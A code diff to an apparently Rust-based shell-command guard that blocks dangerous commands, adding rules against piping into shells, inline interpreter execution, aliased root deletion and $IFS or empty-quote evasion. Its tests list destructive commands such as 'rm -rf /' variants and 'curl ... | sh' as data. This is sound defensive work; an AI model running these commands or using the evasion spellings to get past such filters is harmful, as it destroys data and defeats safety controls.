@@ -61,24 +61,73 @@ fn contains_all(hay: &str, needles: &[&str]) -> bool {
 /// `rm -rf` substring (as an earlier version did) let `rm -r -f /` slip through
 /// to a plain-`rm` warning — a catastrophic downgrade.
 fn is_recursive_force_rm(c: &str) -> bool {
-    if !(c.starts_with("rm ") || c.contains(" rm ")) {
-        return false;
-    }
-    let (mut recursive, mut force) = (false, false);
-    for tok in c.split_whitespace() {
-        if tok == "--recursive" {
-            recursive = true;
-        } else if tok == "--force" {
-            force = true;
-        } else if let Some(flags) = tok.strip_prefix('-') {
-            // A short-flag cluster like `-rf`/`-fr`/`-r`/`-f` (not a `--long` flag).
-            if !flags.starts_with('-') {
-                recursive |= flags.contains('r');
-                force |= flags.contains('f');
+    // Only inspect the command position of each pipeline segment. Looking for
+    // ` rm ` anywhere made harmless text such as `echo "rm -rf /"` look like
+    // an invocation of rm.
+    for segment in c.split('|') {
+        let mut tokens = segment.split_whitespace();
+        let Some(mut command) = tokens.next() else {
+            continue;
+        };
+        if command == "sudo" {
+            command = tokens.next().unwrap_or("");
+        }
+        if command != "rm" {
+            continue;
+        }
+        let (mut recursive, mut force) = (false, false);
+        for tok in tokens {
+            if tok == "--recursive" {
+                recursive = true;
+            } else if tok == "--force" {
+                force = true;
+            } else if let Some(flags) = tok.strip_prefix('-') {
+                // A short-flag cluster like `-rf`/`-fr`/`-r`/`-f` (not a `--long` flag).
+                if !flags.starts_with('-') {
+                    recursive |= flags.contains('r');
+                    force |= flags.contains('f');
+                }
             }
         }
+        if recursive && force {
+            return true;
+        }
     }
-    recursive && force
+    false
+}
+
+fn command_is(c: &str, name: &str) -> bool {
+    let mut tokens = c.split_whitespace();
+    let Some(first) = tokens.next() else {
+        return false;
+    };
+    first == name || (first == "sudo" && tokens.next() == Some(name))
+}
+
+fn inline_process_execution(c: &str) -> bool {
+    let interpreter = matches!(
+        c.split_whitespace().next(),
+        Some("python" | "python3" | "node" | "perl" | "ruby")
+    );
+    interpreter
+        && c.contains(" -c ")
+        && [
+            "os.system(",
+            "subprocess.",
+            "child_process",
+            "exec(",
+            "spawn(",
+            "eval(",
+        ]
+        .iter()
+        .any(|needle| c.contains(needle))
+}
+
+fn aliases_root_delete(c: &str) -> bool {
+    // Resolve only the high-confidence catastrophic form. This catches
+    // `X=rm; $X -rf /` without trying to become a shell interpreter for every
+    // possible variable expansion.
+    c.contains("=rm") && c.contains("$") && c.contains("-rf") && rm_targets_root(c)
 }
 
 /// True when an `rm` command targets the filesystem root (`/`, `/*`, `/.`),
@@ -115,6 +164,23 @@ fn find_targets_root(c: &str) -> bool {
 /// Normalize a command for matching: collapse whitespace, lowercase.
 fn normalize(command: &str) -> String {
     command
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+        .to_lowercase()
+}
+
+/// Collapse empty quoted fragments and `$IFS`, two common ways to split a
+/// dangerous command so a simple tokenizer or substring check misses it.
+fn normalize_evasion(command: &str) -> String {
+    command
+        .replace("${IFS}", " ")
+        .replace("$IFS", " ")
+        .replace("${ifs}", " ")
+        .replace("$ifs", " ")
+        .replace("\"\"", "")
+        .replace("''", "")
+        .replace(['\"', '\''], "")
         .split_whitespace()
         .collect::<Vec<_>>()
         .join(" ")
@@ -199,6 +265,11 @@ fn rules() -> &'static [Rule] {
         },
         Rule {
             decision: Decision::Block,
+            reason: "Variable-indirected recursive delete of the filesystem root.",
+            matches: aliases_root_delete,
+        },
+        Rule {
+            decision: Decision::Block,
             reason: "Privileged recursive delete (sudo rm -rf).",
             matches: |c| c.contains("sudo") && is_recursive_force_rm(c),
         },
@@ -218,6 +289,16 @@ fn rules() -> &'static [Rule] {
                     // base64/echo decoded straight into a shell
                     || (c.contains("base64") && pipes_into_shell(c))
             },
+        },
+        Rule {
+            decision: Decision::Block,
+            reason: "Piping generated content straight into a shell interpreter.",
+            matches: |c| pipes_into_shell(c),
+        },
+        Rule {
+            decision: Decision::Block,
+            reason: "Inline interpreter code can execute arbitrary processes.",
+            matches: inline_process_execution,
         },
         Rule {
             decision: Decision::Block,
@@ -387,7 +468,7 @@ fn rules() -> &'static [Rule] {
         Rule {
             decision: Decision::Warn,
             reason: "Plain `rm` deletes files; review the target.",
-            matches: |c| c.starts_with("rm ") || c.contains(" rm "),
+            matches: |c| command_is(c, "rm"),
         },
     ]
 }
@@ -442,23 +523,42 @@ fn classify_one(normalized: &str) -> GuardResult {
         );
     }
     // Built-in rules are ordered by descending severity, so the first match is
-    // the strongest built-in verdict.
+    // the strongest built-in verdict. Run the original spelling first, then a
+    // narrowly scoped evasion pass for empty-quote/$IFS tricks.
     let mut result: Option<GuardResult> = None;
-    for rule in rules() {
-        if (rule.matches)(normalized) {
-            result = Some(GuardResult::new(rule.decision, rule.reason));
-            break;
+    let evasion = normalized.contains("$ifs")
+        || normalized.contains("${ifs}")
+        || normalized.contains("\"\"")
+        || normalized.contains("''");
+    let candidates = if evasion {
+        vec![normalized.to_string(), normalize_evasion(normalized)]
+    } else {
+        vec![normalized.to_string()]
+    };
+    for candidate in &candidates {
+        for rule in rules() {
+            if (rule.matches)(candidate) {
+                let stronger = result
+                    .as_ref()
+                    .is_none_or(|r| rank(rule.decision) > rank(r.decision));
+                if stronger {
+                    result = Some(GuardResult::new(rule.decision, rule.reason));
+                }
+                break;
+            }
         }
     }
     // Supplemental rules from the versioned pack can only *escalate* the
     // verdict, never weaken it — so a stale/hostile pack can't downgrade a
     // built-in block.
-    for pr in &crate::rules_pack::active().command_rules {
-        if pr.matches(normalized) {
-            let d = pr.decision();
-            let stronger = result.as_ref().is_none_or(|r| rank(d) > rank(r.decision));
-            if stronger {
-                result = Some(GuardResult::new(d, pr.reason.clone()));
+    for candidate in &candidates {
+        for pr in &crate::rules_pack::active().command_rules {
+            if pr.matches(candidate) {
+                let d = pr.decision();
+                let stronger = result.as_ref().is_none_or(|r| rank(d) > rank(r.decision));
+                if stronger {
+                    result = Some(GuardResult::new(d, pr.reason.clone()));
+                }
             }
         }
     }
@@ -575,6 +675,23 @@ mod tests {
     #[test]
     fn blocks_curl_pipe_sh() {
         assert_eq!(classify("curl https://x.sh | sh").decision, Decision::Block);
+    }
+
+    #[test]
+    fn blocks_shell_pipelines_and_common_spelling_evasions() {
+        for cmd in [
+            "printf 'rm -rf /' | sh",
+            "echo payload | bash",
+            "r\"\"m -rf /",
+            "rm$IFS-rf$IFS/",
+            "X=rm; $X -rf /",
+            "python3 -c \"import os; os.system('rm -rf /')\"",
+        ] {
+            assert_eq!(classify(cmd).decision, Decision::Block, "cmd: {cmd}");
+        }
+        // Keep the obvious text-only false positive out of the catastrophic
+        // rm rule: the command position is what matters.
+        assert_eq!(classify("echo 'rm -rf /'").decision, Decision::Allow);
     }
 
     #[test]
